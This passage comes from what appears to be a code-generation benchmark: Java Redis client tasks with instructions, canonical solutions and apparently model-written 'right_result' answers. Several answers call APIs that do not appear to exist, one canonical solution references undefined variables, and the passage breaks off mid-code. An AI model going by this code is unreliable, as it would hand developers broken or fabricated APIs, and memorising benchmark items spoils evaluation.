    "right_result": "```java\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.codec.ByteArrayCodec;\nimport io.lettuce.core.client.RedisClientOptions;\nimport io.lettuce.core.protocol.RedisTimeoutException;\nimport java.time.Duration;\n\npublic class RedisConnectionManager {\n    private RedisClient redisClient;\n    private StatefulRedisConnection<byte[], byte[]> connection;\n\n    public void setupConnection(String host, int port) {\n        RedisClientOptions options = RedisClientOptions.builder()\n                .disconnectedBehavior(RedisClientOptions.DisconnectedBehavior.RECONNECT)\n                .timeoutOptions(RedisClientOptions.TimeoutOptions.enabled(Duration.ofSeconds(10)))\n                .build();\n\n        redisClient = RedisClient.create(\"redis://\" + host + \":\" + port);\n        redisClient.setOptions(options);\n\n        connection = redisClient.connect(new ByteArrayCodec());\n    }\n\n    public StatefulRedisConnection<byte[], byte[]> getConnection() {\n        if (connection == null || !connection.isOpen()) {\n            throw new RedisTimeoutException(\"Redis connection is not open.\");\n        }\n        return connection;\n    }\n\n    public void closeConnection() {\n        if (connection != null && connection.isOpen()) {\n            connection.close();\n        }\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 314,
    "Instruction": "Task Description: Implement a Redis cluster connection provider in Java that manages connections to a Redis cluster, handles slot-based routing, and provides connection pooling functionality.\n\nClass Description: ClusterConnectionProvider is a connection management class for Redis clusters that maintains a cache of cluster nodes and slots, provides connections based on slot hashing, and handles connection failures with retry logic.\n\nAttributes:\n- cache: JedisClusterInfoCache - Maintains information about cluster nodes, slots, and connection pools\n\nMethods:\n- initializeSlotsCache(Set<HostAndPort>, JedisClientConfig) -> void - Initializes the cluster slots cache by connecting to seed nodes and discovering cluster topology\n- getConnection(CommandArguments) -> Connection - Retrieves a connection based on command arguments (slot-aware)\n- getConnection() -> Connection - Gets a random connection from available cluster nodes\n- getConnectionFromSlot(int) -> Connection - Gets a connection specifically for a given hash slot\n- renewSlotCache() -> void - Refreshes the cluster slots information\n- close() -> void - Closes all connections and releases resources\n- getConnectionMap() -> Map<String, ConnectionPool> - Returns an unmodifiable map of all node connections",
    "Canonical_solution": "import java.time.Duration;\nimport java.util.ArrayList;\nimport java.util.Collections;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.Set;\nimport java.util.concurrent.ThreadLocalRandom;\n\nimport org.apache.commons.pool2.impl.GenericObjectPoolConfig;\n\nimport redis.clients.jedis.ClusterCommandArguments;\nimport redis.clients.jedis.CommandArguments;\nimport redis.clients.jedis.HostAndPort;\nimport redis.clients.jedis.JedisClientConfig;\nimport redis.clients.jedis.Connection;\nimport redis.clients.jedis.ConnectionPool;\nimport redis.clients.jedis.JedisClusterInfoCache;\nimport redis.clients.jedis.exceptions.JedisClusterOperationException;\nimport redis.clients.jedis.exceptions.JedisException;\n\npublic class ClusterConnectionProvider implements ConnectionProvider {\n\n  protected final JedisClusterInfoCache cache;\n\n  public ClusterConnectionProvider(Set<HostAndPort> clusterNodes, JedisClientConfig clientConfig) {\n    this.cache = new JedisClusterInfoCache(clientConfig, clusterNodes);\n    initializeSlotsCache(clusterNodes, clientConfig);\n  }\n\n  private void initializeSlotsCache(Set<HostAndPort> startNodes, JedisClientConfig clientConfig) {\n    if (startNodes.isEmpty()) {\n      throw new JedisClusterOperationException(\"No nodes to initialize cluster slots cache.\");\n    }\n\n    ArrayList<HostAndPort> startNodeList = new ArrayList<>(startNodes);\n    Collections.shuffle(startNodeList);\n\n    JedisException firstException = null;\n    for (HostAndPort hostAndPort : startNodeList) {\n      try (Connection jedis = new Connection(hostAndPort, clientConfig)) {\n        cache.discoverClusterNodesAndSlots(jedis);\n        return;\n      } catch (JedisException e) {\n        if (firstException == null) {\n          firstException = e;\n        }\n      }\n    }\n\n    JedisClusterOperationException uninitializedException\n        = new JedisClusterOperationException(\"Could not initialize cluster slots cache.\");\n    uninitializedException.addSuppressed(firstException);\n    throw uninitializedException;\n  }\n\n  @Override\n  public Connection getConnection(CommandArguments args) {\n    final int slot = ((ClusterCommandArguments) args).getCommandHashSlot();\n    return slot >= 0 ? getConnectionFromSlot(slot) : getConnection();\n  }\n\n  @Override\n  public Connection getConnection() {\n    List<ConnectionPool> pools = cache.getShuffledNodesPool();\n\n    JedisException suppressed = null;\n    for (ConnectionPool pool : pools) {\n      Connection jedis = null;\n      try {\n        jedis = pool.getResource();\n        if (jedis == null) {\n          continue;\n        }\n\n        jedis.ping();\n        return jedis;\n\n      } catch (JedisException ex) {\n        if (suppressed == null) {\n          suppressed = ex;\n        }\n        if (jedis != null) {\n          jedis.close();\n        }\n      }\n    }\n\n    JedisClusterOperationException noReachableNode = new JedisClusterOperationException(\"No reachable node in cluster.\");\n    if (suppressed != null) {\n      noReachableNode.addSuppressed(suppressed);\n    }\n    throw noReachableNode;\n  }\n\n  public Connection getConnectionFromSlot(int slot) {\n    ConnectionPool connectionPool = cache.getSlotPool(slot);\n    if (connectionPool != null) {\n      return connectionPool.getResource();\n    } else {\n      renewSlotCache();\n      connectionPool = cache.getSlotPool(slot);\n      if (connectionPool != null) {\n        return connectionPool.getResource();\n      } else {\n        return getConnection();\n      }\n    }\n  }\n\n  public void renewSlotCache() {\n    cache.renewClusterSlots(null);\n  }\n\n  @Override\n  public void close() {\n    cache.close();\n  }\n\n  @Override\n  public Map<String, ConnectionPool> getConnectionMap() {\n    return Collections.unmodifiableMap(cache.getNodes());\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport redis.clients.jedis.HostAndPort;\nimport redis.clients.jedis.JedisClientConfig;\nimport redis.clients.jedis.JedisClusterInfoCache;\nimport redis.clients.jedis.ConnectionPool;\nimport redis.clients.jedis.CommandArguments;\n\nimport java.util.Map;\nimport java.util.Set;\nimport java.util.concurrent.ThreadLocalRandom;\n\npublic class ClusterConnectionProvider {\n\n    private final JedisClusterInfoCache cache;\n\n    public ClusterConnectionProvider() {\n        this.cache = new JedisClusterInfoCache();\n    }\n\n    public void initializeSlotsCache(Set<HostAndPort> nodes, JedisClientConfig clientConfig) {\n        cache.init(nodes, clientConfig);\n    }\n\n    public Connection getConnection(CommandArguments args) {\n        return getConnectionFromSlot(args.getSlot());\n    }\n\n    public Connection getConnection() {\n        Map<String, ConnectionPool> connectionMap = getConnectionMap();\n        if (connectionMap.isEmpty()) {\n            throw new IllegalStateException(\"No available connections in the cluster.\");\n        }\n        String randomKey = (String) connectionMap.keySet().toArray()[ThreadLocalRandom.current().nextInt(connectionMap.size())];\n        return connectionMap.get(randomKey).getResource();\n    }\n\n    public Connection getConnectionFromSlot(int slot) {\n        return cache.getConnection(slot).getResource();\n    }\n\n    public void renewSlotCache() {\n        cache.renew();\n    }\n\n    public void close() {\n        cache.close();\n    }\n\n    public Map<String, ConnectionPool> getConnectionMap() {\n        return Map.copyOf(cache.getConnectionPools());\n    }\n}\n```"
  },
  {
    "Task_id": 316,
    "Instruction": "Task Description: Implement a Redis Sentinel-based connection provider in Java that can discover and connect to the current Redis master node through Sentinel servers.\n\nClass Description: SentineledConnectionProvider is a utility class that manages Redis connections in a Sentinel environment. It discovers the current master node through Sentinel servers and establishes connections to it.\n\nAttributes:\n- masterName: String - The name of the Redis master node as configured in Sentinel\n- masterConfig: JedisClientConfig - Configuration for connecting to the Redis master\n- sentinels: Set<HostAndPort> - Set of Sentinel server addresses (host and port)\n- sentinelConfig: JedisClientConfig - Configuration for connecting to Sentinel servers\n\nMethods:\n- getConnection() -> Connection - Discovers the current master node through Sentinel and returns an established connection to it\n- discoverMaster() -> HostAndPort - Internal method that queries Sentinel servers to find the current master node's address\n- close() -> void - Cleans up any resources (currently a placeholder for future implementation)\n\nInput: \n- Constructor parameters:\n  - masterName: String\n  - masterConfig: JedisClientConfig\n  - sentinels: Set<HostAndPort>\n  - sentinelConfig: JedisClientConfig\n\nOutput:\n- getConnection() returns a connected Connection object to the current Redis master\n- discoverMaster() returns the HostAndPort of the current master node\n- close() has no return value",
    "Canonical_solution": "import redis.clients.jedis.*;\nimport redis.clients.jedis.exceptions.JedisConnectionException;\nimport redis.clients.jedis.exceptions.JedisException;\nimport org.apache.commons.pool2.impl.GenericObjectPoolConfig;\nimport java.util.Set;\nimport java.util.HashSet;\n\npublic class SentineledConnectionProvider {\n\n    private final String masterName;\n    private final JedisClientConfig masterConfig;\n    private final Set<HostAndPort> sentinels;\n    private final JedisClientConfig sentinelConfig;\n\n    public SentineledConnectionProvider(String masterName, JedisClientConfig masterConfig,\n                                      Set<HostAndPort> sentinels, JedisClientConfig sentinelConfig) {\n        this.masterName = masterName;\n        this.masterConfig = masterConfig;\n        this.sentinels = sentinels;\n        this.sentinelConfig = sentinelConfig;\n    }\n\n    public Connection getConnection() {\n        try {\n            HostAndPort master = discoverMaster();\n            Connection connection = new Connection(master, masterConfig);\n            connection.connect();\n            return connection;\n        } catch (JedisException e) {\n            throw new JedisConnectionException(\"Failed to get connection from sentinel\", e);\n        }\n    }\n\n    private HostAndPort discoverMaster() {\n        for (HostAndPort sentinel : sentinels) {\n            try (Jedis jedis = new Jedis(sentinel, sentinelConfig)) {\n                String masterHost = jedis.sentinelGetMasterAddrByName(masterName).get(0);\n                int masterPort = Integer.parseInt(jedis.sentinelGetMasterAddrByName(masterName).get(1));\n                return new HostAndPort(masterHost, masterPort);\n            } catch (Exception e) {\n                continue;\n            }\n        }\n        throw new JedisException(\"Could not discover master from sentinels\");\n    }\n\n    public void close() {\n        // Cleanup resources if needed\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport redis.clients.jedis.HostAndPort;\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisClientConfig;\nimport redis.clients.jedis.JedisSentinelPool;\nimport redis.clients.jedis.Connection;\n\nimport java.util.Set;\n\npublic class SentineledConnectionProvider {\n    private final String masterName;\n    private final JedisClientConfig masterConfig;\n    private final Set<HostAndPort> sentinels;\n    private final JedisClientConfig sentinelConfig;\n\n    public SentineledConnectionProvider(String masterName, JedisClientConfig masterConfig, Set<HostAndPort> sentinels, JedisClientConfig sentinelConfig) {\n        this.masterName = masterName;\n        this.masterConfig = masterConfig;\n        this.sentinels = sentinels;\n        this.sentinelConfig = sentinelConfig;\n    }\n\n    public Connection getConnection() {\n        HostAndPort master = discoverMaster();\n        Jedis jedis = new Jedis(master.getHost(), master.getPort(), masterConfig);\n        return jedis.getConnection();\n    }\n\n    private HostAndPort discoverMaster() {\n        try (JedisSentinelPool pool = new JedisSentinelPool(masterName, sentinels, sentinelConfig)) {\n            return pool.getCurrentHostMaster();\n        }\n    }\n\n    public void close() {\n        // Future implementation for resource cleanup\n    }\n}\n```"
  },
  {
    "Task_id": 317,
    "Instruction": "Task Description: Create a Java class that provides a client interface for interacting with Redis Search functionality, including index creation, document management, search operations, and aggregation.\n\nClass Description: The RedisSearchClient class encapsulates Redis Search operations using the Jedis client library. It manages a connection to Redis and provides methods for creating search indexes, adding JSON documents, performing searches, and running aggregations.\n\nAttributes:\n- jedis: JedisPooled - The pooled Redis client connection used for all operations\n\nMethods:\n- RedisSearchClient(String host, int port) -> void - Constructor that initializes the Redis connection with the specified host and port\n- createIndex(String indexName, String prefix, SchemaField[] schema) -> void - Creates a new search index with the given name, prefix, and schema definition\n- addDocument(String key, Object document) -> void - Adds a JSON document to Redis with the specified key\n- search(String indexName, Query query) -> List<Document> - Performs a search query on the specified index and returns matching documents\n- aggregate(String indexName, AggregationBuilder aggregationBuilder) -> AggregationResult - Executes an aggregation query on the specified index and returns the results\n- close() -> void - Closes the Redis connection and releases resources",
    "Canonical_solution": "import redis.clients.jedis.JedisPooled;\nimport redis.clients.jedis.search.*;\nimport redis.clients.jedis.search.aggr.*;\nimport redis.clients.jedis.search.schemafields.*;\n\npublic class RedisSearchClient {\n\n    private JedisPooled jedis;\n\n    public RedisSearchClient(String host, int port) {\n        this.jedis = new JedisPooled(host, port);\n    }\n\n    public void createIndex(String indexName, String prefix, SchemaField[] schema) {\n        jedis.ftCreate(indexName,\n            FTCreateParams.createParams()\n                .on(IndexDataType.JSON)\n                .addPrefix(prefix),\n            schema\n        );\n    }\n\n    public void addDocument(String key, Object document) {\n        jedis.jsonSetWithEscape(key, document);\n    }\n\n    public List<Document> search(String indexName, Query query) {\n        return jedis.ftSearch(indexName, query).getDocuments();\n    }\n\n    public AggregationResult aggregate(String indexName, AggregationBuilder aggregationBuilder) {\n        return jedis.ftAggregate(indexName, aggregationBuilder);\n    }\n\n    public void close() {\n        jedis.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport redis.clients.jedis.*;\nimport redis.clients.jedis.search.*;\nimport redis.clients.jedis.search.aggr.AggregationBuilder;\nimport redis.clients.jedis.search.aggr.AggregationResult;\nimport redis.clients.jedis.search.query.Query;\n\nimport java.util.List;\n\npublic class RedisSearchClient {\n    private final JedisPooled jedis;\n\n    public RedisSearchClient(String host, int port) {\n        this.jedis = new JedisPooled(host, port);\n    }\n\n    public void createIndex(String indexName, String prefix, SchemaField[] schema) {\n        IndexDefinition definition = new IndexDefinition();\n        definition.setPrefix(prefix);\n        Schema sc = new Schema();\n        for (SchemaField field : schema) {\n            sc.addField(field);\n        }\n        FTCreateOptions options = FTCreateOptions.create().setDefinition(definition).setDefaultScore(1.0);\n        jedis.ftcreate(indexName, options, sc);\n    }\n\n    public void addDocument(String key, Object document) {\n        jedis.jsonSet(key, RedisSerializer.JSON, document);\n    }\n\n    public List<Document> search(String indexName, Query query) {\n        return jedis.ftsearch(indexName, query, FTSearchOptions.defaultOptions().withDocuments());\n    }\n\n    public AggregationResult aggregate(String indexName, AggregationBuilder aggregationBuilder) {\n        return aggregationBuilder.build().doAggregate(jedis, indexName);\n    }\n\n    public void close() {\n        if (jedis != null) {\n            try {\n                jedis.close();\n            } catch (Exception e) {\n                // Handle or log exception as needed\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 318,
    "Instruction": "Task Description: Create a Redis connection manager class that handles both standalone and cluster Redis connections with token-based authentication for multiple users.\n\nClass Description: The RedisConnectionManager class provides functionality to establish and manage Redis connections (both standalone and cluster) using token-based authentication. It supports multiple authentication credentials and configures connection options like timeouts and reauthentication behavior.\n\nAttributes:\n- redisClient: RedisClient - The client for standalone Redis connections\n- redisClusterClient: RedisClusterClient - The client for Redis cluster connections\n- credentialsUser1: TokenBasedRedisCredentialsProvider - Authentication credentials provider for user 1\n- credentialsUser2: TokenBasedRedisCredentialsProvider - Authentication credentials provider for user 2\n\nMethods:\n- RedisConnectionManager(String redisUri, String authority, Set<String> scopes, String user1ClientId, String user1Secret, String user2ClientId, String user2Secret) -> void - Constructor that initializes the connection manager with Redis URI, authentication authority, scopes, and credentials for two users\n- createStandaloneConnection() -> StatefulRedisConnection<String, String> - Creates and returns a standalone Redis connection using user1 credentials\n- createStandaloneConnectionWithUser2() -> StatefulRedisConnection<String, String> - Creates and returns a standalone Redis connection using user2 credentials\n- createClusterConnection() -> StatefulRedisClusterConnection<String, String> - Creates and returns a Redis cluster connection\n- close() -> void - Closes all connections and releases resources",
    "Canonical_solution": "import io.lettuce.authx.TokenBasedRedisCredentialsProvider;\nimport io.lettuce.core.ClientOptions;\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.SocketOptions;\nimport io.lettuce.core.TimeoutOptions;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.cluster.ClusterClientOptions;\nimport io.lettuce.core.cluster.RedisClusterClient;\nimport io.lettuce.core.cluster.api.StatefulRedisClusterConnection;\nimport io.lettuce.core.cluster.api.sync.NodeSelection;\nimport io.lettuce.core.cluster.api.sync.RedisAdvancedClusterCommands;\nimport io.lettuce.core.codec.StringCodec;\nimport redis.clients.authentication.core.IdentityProviderConfig;\nimport redis.clients.authentication.core.TokenAuthConfig;\nimport redis.clients.authentication.entraid.EntraIDTokenAuthConfigBuilder;\n\nimport java.time.Duration;\nimport java.util.Collections;\nimport java.util.Set;\n\npublic class RedisConnectionManager {\n\n    private RedisClient redisClient;\n    private RedisClusterClient redisClusterClient;\n    private TokenBasedRedisCredentialsProvider credentialsUser1;\n    private TokenBasedRedisCredentialsProvider credentialsUser2;\n\n    public RedisConnectionManager(String redisUri, String authority, Set<String> scopes, \n                                String user1ClientId, String user1Secret, \n                                String user2ClientId, String user2Secret) {\n        IdentityProviderConfig config1;\n        try (EntraIDTokenAuthConfigBuilder builder = EntraIDTokenAuthConfigBuilder.builder()) {\n            config1 = builder.authority(authority).clientId(user1ClientId).secret(user1Secret).scopes(scopes)\n                    .tokenRequestExecTimeoutInMs(10000).build().getIdentityProviderConfig();\n        }\n\n        TokenAuthConfig tokenAuthConfigUser1 = TokenAuthConfig.builder().tokenRequestExecTimeoutInMs(10000)\n                .expirationRefreshRatio(0.1f).identityProviderConfig(config1).build();\n        credentialsUser1 = TokenBasedRedisCredentialsProvider.create(tokenAuthConfigUser1);\n\n        IdentityProviderConfig config2 = EntraIDTokenAuthConfigBuilder.builder().authority(authority).clientId(user2ClientId)\n                .secret(user2Secret).scopes(scopes).tokenRequestExecTimeoutInMs(10000).build().getIdentityProviderConfig();\n        TokenAuthConfig tokenAuthConfigUser2 = TokenAuthConfig.builder().tokenRequestExecTimeoutInMs(10000)\n                .expirationRefreshRatio(0.1f).identityProviderConfig(config2).build();\n        credentialsUser2 = TokenBasedRedisCredentialsProvider.create(tokenAuthConfigUser2);\n\n        RedisURI redisURI1 = RedisURI.create(redisUri);\n        redisURI1.setCredentialsProvider(credentialsUser1);\n\n        RedisURI redisURI2 = RedisURI.create(redisUri);\n        redisURI2.setCredentialsProvider(credentialsUser2);\n\n        ClientOptions clientOptions = ClientOptions.builder()\n                .socketOptions(SocketOptions.builder().connectTimeout(Duration.ofSeconds(5)).build())\n                .disconnectedBehavior(ClientOptions.DisconnectedBehavior.REJECT_COMMANDS)\n                .timeoutOptions(TimeoutOptions.enabled(Duration.ofSeconds(1)))\n                .reauthenticateBehavior(ClientOptions.ReauthenticateBehavior.ON_NEW_CREDENTIALS).build();\n\n        redisClient = RedisClient.create(redisURI1);\n        redisClient.setOptions(clientOptions);\n    }\n\n    public StatefulRedisConnection<String, String> createStandaloneConnection() {\n        return redisClient.connect(StringCodec.UTF8);\n    }\n\n    public StatefulRedisConnection<String, String> createStandaloneConnectionWithUser2() {\n        RedisURI redisURI2 = RedisURI.create(REDIS_URI);\n        redisURI2.setCredentialsProvider(credentialsUser2);\n        return redisClient.connect(StringCodec.UTF8, redisURI2);\n    }\n\n    public StatefulRedisClusterConnection<String, String> createClusterConnection() {\n        ClusterClientOptions clusterClientOptions = ClusterClientOptions.builder()\n                .socketOptions(SocketOptions.builder().connectTimeout(Duration.ofSeconds(5)).build())\n                .disconnectedBehavior(ClientOptions.DisconnectedBehavior.REJECT_COMMANDS)\n                .timeoutOptions(TimeoutOptions.enabled(Duration.ofSeconds(1)))\n                .reauthenticateBehavior(ClientOptions.ReauthenticateBehavior.ON_NEW_CREDENTIALS).build();\n\n        redisClusterClient = RedisClusterClient.create(redisURI1);\n        redisClusterClient.setOptions(clusterClientOptions);\n        return redisClusterClient.connect(StringCodec.UTF8);\n    }\n\n    public void close() {\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n        if (redisClusterClient != null) {\n            redisClusterClient.shutdown();\n        }\n        if (credentialsUser1 != null) {\n            credentialsUser1.close();\n        }\n        if (credentialsUser2 != null) {\n            credentialsUser2.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport io.lettuce.core.*;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.api.StatefulRedisClusterConnection;\nimport io.lettuce.core.cluster.RedisClusterClient;\nimport io.lettuce.core.support.ConnectionPoolSupport;\nimport io.lettuce.core.support.CredentialsProvider;\n\nimport java.time.Duration;\nimport java.util.Set;\n\npublic class RedisConnectionManager {\n\n    private final RedisClient redisClient;\n    private final RedisClusterClient redisClusterClient;\n    private final TokenBasedRedisCredentialsProvider credentialsUser1;\n    private final TokenBasedRedisCredentialsProvider credentialsUser2;\n\n    public RedisConnectionManager(String redisUri, String authority, Set<String> scopes, String user1ClientId, String user1Secret, String user2ClientId, String user2Secret) {\n        this.credentialsUser1 = new TokenBasedRedisCredentialsProvider(authority, scopes, user1ClientId, user1Secret);\n        this.credentialsUser2 = new TokenBasedRedisCredentialsProvider(authority, scopes, user2ClientId, user2Secret);\n\n        RedisURI redisURI = RedisURI.create(redisUri);\n        redisURI.setAuthentication(credentialsUser1.getToken());\n\n        this.redisClient = RedisClient.create(redisURI);\n        this.redisClusterClient = RedisClusterClient.create(redisURI);\n    }\n\n    public StatefulRedisConnection<String, String> createStandaloneConnection() {\n        RedisURI connectionURI = RedisURI.create(((RedisURI) redisClient.getOptions()).getHost(), ((RedisURI) redisClient.getOptions()).getPort());\n        connectionURI.setAuthentication(credentialsUser1.getToken());\n        return redisClient.connect(connectionURI);\n    }\n\n    public StatefulRedisConnection<String, String> createStandaloneConnectionWithUser2() {\n        RedisURI connectionURI = RedisURI.create(((RedisURI) redisClient.getOptions()).getHost(), ((RedisURI) redisClient.getOptions()).getPort());\n        connectionURI.setAuthentication(credentialsUser2.getToken());\n        return redisClient.connect(connectionURI);\n    }\n\n    public StatefulRedisClusterConnection<String, String> createClusterConnection() {\n        RedisURI connectionURI = RedisURI.create(((RedisURI) redisClient.getOptions()).getHost(), ((RedisURI) redisClient.getOptions()).getPort());\n        connectionURI.setAuthentication(credentialsUser1.getToken());\n        return redisClusterClient.connect(connectionURI);\n    }\n\n    public void close() {\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n        if (redisClusterClient != null) {\n            redisClusterClient.shutdown();\n        }\n    }\n}\n\nclass TokenBasedRedisCredentialsProvider implements CredentialsProvider {\n\n    private final String token;\n\n    public TokenBasedRedisCredentialsProvider(String authority, Set<String> scopes, String clientId, String clientSecret) {\n        // Simulate token generation from an authentication authority\n        this.token = generateToken(authority, scopes, clientId, clientSecret);\n    }\n\n    private String generateToken(String authority, Set<String> scopes, String clientId, String clientSecret) {\n        // In a real-world scenario, this would call an external service to get the token\n        return \"Bearer:example_token\";\n    }\n\n    public String getToken() {\n        return token;\n    }\n}\n```"
  },
  {
    "Task_id": 319,
    "Instruction": "Task Description: Create a singleton Redis client class that manages a single Redis connection instance throughout the application lifecycle, with automatic shutdown handling.\n\nClass Description: DefaultRedisClient is a singleton class that provides centralized Redis client management. It creates and maintains a single RedisClient instance, configures default timeout settings, and ensures proper resource cleanup during JVM shutdown.\n\nAttributes:\n- instance: DefaultRedisClient - The singleton instance of the class\n- redisClient: RedisClient - The underlying Redis client connection instance\n\nMethods:\n- get() -> RedisClient - Returns the singleton RedisClient instance after setting a default timeout of 60 seconds\n- DefaultRedisClient() (constructor) - Private constructor that initializes the RedisClient with connection settings and registers a shutdown hook\n- run() (in anonymous Thread class) - Shutdown hook method that cleans up Redis client resources during JVM shutdown",
    "Canonical_solution": "import io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.test.settings.TestSettings;\nimport java.util.concurrent.TimeUnit;\n\npublic class DefaultRedisClient {\n\n    private static final DefaultRedisClient instance = new DefaultRedisClient();\n\n    private RedisClient redisClient;\n\n    private DefaultRedisClient() {\n        redisClient = RedisClient.create(RedisURI.Builder.redis(TestSettings.host(), TestSettings.port()).build());\n        Runtime.getRuntime().addShutdownHook(new Thread() {\n            @Override\n            public void run() {\n                FastShutdown.shutdown(redisClient);\n            }\n        });\n    }\n\n    public static RedisClient get() {\n        instance.redisClient.setDefaultTimeout(60, TimeUnit.SECONDS);\n        return instance.redisClient;\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPoolConfig;\n\npublic class DefaultRedisClient {\n    private static final DefaultRedisClient instance = new DefaultRedisClient();\n    private final JedisPool redisClient;\n\n    private DefaultRedisClient() {\n        JedisPoolConfig poolConfig = new JedisPoolConfig();\n        poolConfig.setMaxTotal(10);\n        poolConfig.setMaxIdle(5);\n        poolConfig.setMinIdle(1);\n        poolConfig.setTestOnBorrow(true);\n\n        redisClient = new JedisPool(poolConfig, \"localhost\", 6379, 60000);\n\n        Thread shutdownHook = new Thread(() -> {\n            if (redisClient != null) {\n                redisClient.close();\n            }\n        });\n        Runtime.getRuntime().addShutdownHook(shutdownHook);\n    }\n\n    public static DefaultRedisClient getInstance() {\n        return instance;\n    }\n\n    public Jedis get() {\n        return redisClient.getResource();\n    }\n}\n```"
  },
  {
    "Task_id": 324,
    "Instruction": "Task Description: Create a Java class that provides functionality to connect to Redis Sentinel instances and Redis masters via Sentinel, with support for SSL/TLS connections and custom DNS resolution.\n\nClass Description: The RedisSentinelConnector class facilitates connections to Redis Sentinel servers and Redis master instances through Sentinel, with configurable SSL/TLS options and custom DNS resolution capabilities.\n\nAttributes:\n- clientResources: [ClientResources] - The Lettuce client resources configuration including custom DNS resolver and other client settings\n\nMethods:\n- RedisSentinelConnector([ClientResources clientResources]) -> [RedisSentinelConnector] - Constructor that initializes the connector with custom client resources including DNS resolution configuration\n- connectToSentinelDirectly([String host]) -> [StatefulRedisSentinelConnection<String, String>] - Establishes a direct connection to a Redis Sentinel server with SSL/TLS (peer verification disabled)\n- connectToMasterViaSentinel([String host, String masterId, File truststore]) -> [StatefulRedisConnection<String, String>] - Connects to a Redis master via Sentinel with SSL/TLS using the specified truststore for certificate verification\n- closeConnection([AutoCloseable connection, RedisClient client]) -> [void] - Safely closes the given connection and shuts down the associated Redis client",
    "Canonical_solution": "import io.lettuce.core.*;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.resource.ClientResources;\nimport io.lettuce.core.resource.DnsResolver;\nimport io.lettuce.core.resource.MappingSocketAddressResolver;\nimport io.lettuce.core.sentinel.api.StatefulRedisSentinelConnection;\nimport io.lettuce.test.resource.FastShutdown;\n\npublic class RedisSentinelConnector {\n\n    private final ClientResources clientResources;\n\n    public RedisSentinelConnector(ClientResources clientResources) {\n        this.clientResources = clientResources.mutate()\n                .socketAddressResolver(MappingSocketAddressResolver.create(DnsResolver.jvmDefault(), hostAndPort -> {\n                    return HostAndPort.of(hostAndPort.getHostText(), hostAndPort.getPort() + 443);\n                })).build();\n    }\n\n    public StatefulRedisSentinelConnection<String, String> connectToSentinelDirectly(String host) {\n        RedisURI redisURI = RedisURI.create(\"rediss://\" + host + \":\" + RedisURI.DEFAULT_SENTINEL_PORT);\n        redisURI.setVerifyPeer(false);\n\n        RedisClient client = RedisClient.create(clientResources);\n        StatefulRedisSentinelConnection<String, String> connection = client.connectSentinel(redisURI);\n        return connection;\n    }\n\n    public StatefulRedisConnection<String, String> connectToMasterViaSentinel(String host, String masterId, File truststore) {\n        RedisURI redisURI = RedisURI.create(\"rediss-sentinel://\" + host + \":\" + RedisURI.DEFAULT_SENTINEL_PORT\n                + \"?sentinelMasterId=\" + masterId);\n        SslOptions options = SslOptions.builder().truststore(truststore).build();\n\n        RedisClient client = RedisClient.create(clientResources);\n        client.setOptions(ClientOptions.builder().sslOptions(options).build());\n        StatefulRedisConnection<String, String> connection = client.connect(redisURI);\n        return connection;\n    }\n\n    public void closeConnection(AutoCloseable connection, RedisClient client) {\n        try {\n            if (connection != null) {\n                connection.close();\n            }\n        } finally {\n            if (client != null) {\n                FastShutdown.shutdown(client);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport io.lettuce.core.*;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.api.StatefulRedisSentinelConnection;\nimport io.lettuce.core.resource.ClientResources;\nimport io.lettuce.core.sentinel.RedisSentinelClient;\nimport io.lettuce.core.support.DnsResolver;\n\nimport javax.net.ssl.SSLParameters;\nimport java.io.File;\nimport java.security.KeyStore;\nimport java.time.Duration;\nimport java.util.concurrent.TimeUnit;\n\npublic class RedisSentinelConnector {\n\n    private final ClientResources clientResources;\n\n    public RedisSentinelConnector(ClientResources clientResources) {\n        this.clientResources = clientResources;\n    }\n\n    public StatefulRedisSentinelConnection<String, String> connectToSentinelDirectly(String host) throws Exception {\n        RedisSentinelClient sentinelClient = RedisSentinelClient.create(clientResources);\n        RedisURI redisURI = RedisURI.builder()\n                .withHost(host)\n                .withPort(26379)\n                .withSsl(true)\n                .withVerifyPeer(false)\n                .build();\n\n        SSLParameters sslParams = new SSLParameters();\n        sslParams.setEndpointIdentificationAlgorithm(\"\");\n        redisURI.setSslParameters(sslParams);\n\n        return sentinelClient.connect(redisURI);\n    }\n\n    public StatefulRedisConnection<String, String> connectToMasterViaSentinel(String host, String masterId, File truststore) throws Exception {\n        RedisSentinelClient sentinelClient = RedisSentinelClient.create(clientResources);\n        RedisURI redisURI = RedisURI.builder()\n                .withHost(host)\n                .withPort(26379)\n                .withSsl(true)\n                .withTrustStore(truststore)\n                .withTrustStorePassword(\"changeit\")\n                .withVerifyPeer(true)\n                .build();\n\n        RedisClient redisClient = RedisClient.create(sentinelClient.getSentinelCommands().getMasterAddrByNAME(masterId).get(0));\n        redisClient.setOptions(ClientOptions.builder()\n                .setSsl(true)\n                .setTrustStore(truststore)\n                .setTrustStorePassword(\"changeit\")\n                .build());\n\n        return redisClient.connect();\n    }\n\n    public void closeConnection(AutoCloseable connection, RedisClient client) {\n        if (connection != null) {\n            try {\n                connection.close();\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n        if 